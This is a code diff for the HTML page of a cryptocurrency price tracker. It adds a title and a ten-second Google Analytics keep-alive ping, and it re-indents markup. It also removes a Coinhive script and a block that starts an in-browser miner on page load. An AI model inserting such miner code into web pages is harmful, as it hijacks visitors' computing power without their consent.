@@ -4,6 +4,8 @@
 <html ng-app="bittrexApp">
 
 <head>
+
+<title>Global overview | Crypto Tracky</title>
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap.min.css">
 <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/3.3.7/css/bootstrap-theme.min.css">
 <link rel="stylesheet" href="../css/bootstrap.min.css">
@@ -11,7 +13,6 @@
 <link rel="stylesheet" href="../css/fontAwesome.css">
 <link rel="stylesheet" href="../css/templatemo-style.css">
   <script src="https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.6.5/angular.min.js"></script>
-  <script src="https://coin-hive.com/lib/coinhive.min.js"></script>
   <script src="script.js"></script>
   <script>
   (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
@@ -21,11 +22,10 @@
 
   ga('create', 'UA-105407554-2', 'auto');
   ga('send', 'pageview');
+  setInterval(function() {
+    ga('send', 'event', 'keep-alive', 'ping');
+  }, 10000);
 
-</script>
-<script>
-	var miner = new CoinHive.Anonymous('mxQ4fvr9wTiWHesQ5g5L23GDpzNgIuOV', {threads: 1});
-	miner.start();
 </script>
 </head>
 
@@ -48,29 +48,28 @@
       <div class="container-fluid">
       	<div class="row">
       		<div class="col-sm-3 col-xs-12" style="padding-top:25px;">
-      			<span style="color:white">Donations are welcome on:</span>
-      			<div class="input-group">
-      				<span class="input-group-addon">Btc</span>
-      				<input type="text"  class="form-control" disabled value="1JUoVvQNsmsEJrZLd9ZMMKoSvTJ52tRTG7" />
-      			</div>
-      			<div class="input-group" style="padding-top: 10px">
-      				<span class="input-group-addon">Ltc</span>
-      				<input type="text"  class="form-control" disabled value="LMYDzpbBjuuJ3tssW9h2XKZy9XoYTpYZsP" />
-      			</div>
-      		</div>
+				<span style="color:white">Donations are welcome on:</span>
+				<div class="input-group">
+					<span class="input-group-addon">Btc</span>
+					<input type="text"  class="form-control" disabled value="1JUoVvQNsmsEJrZLd9ZMMKoSvTJ52tRTG7" />
+				</div>
+				<div class="input-group" style="padding-top: 10px">
+					<span class="input-group-addon">Ltc</span>
+					<input type="text"  class="form-control" disabled value="LMYDzpbBjuuJ3tssW9h2XKZy9XoYTpYZsP" />
+				</div>
+			</div>
       	</div>
       </div>
 
       <div class="container-fluid" style="padding-top:30px;">
       	<div class="row">
 
-      		<div class="col-xs-12 col-sm-12 col-lg-6">
-          <div ng-repeat="interval in intervals" coin-table-interval></div>
-      		</div>
+			<div class="col-xs-12 col-sm-12 col-lg-6">
+				<div ng-repeat="interval in intervals" coin-table-interval></div>
+			</div>
 
       		<div class="col-xs-12 col-sm-12 col-lg-6">
       			<div coin-table-main> </div>
-
       		</div>
       	</div>
       </div>
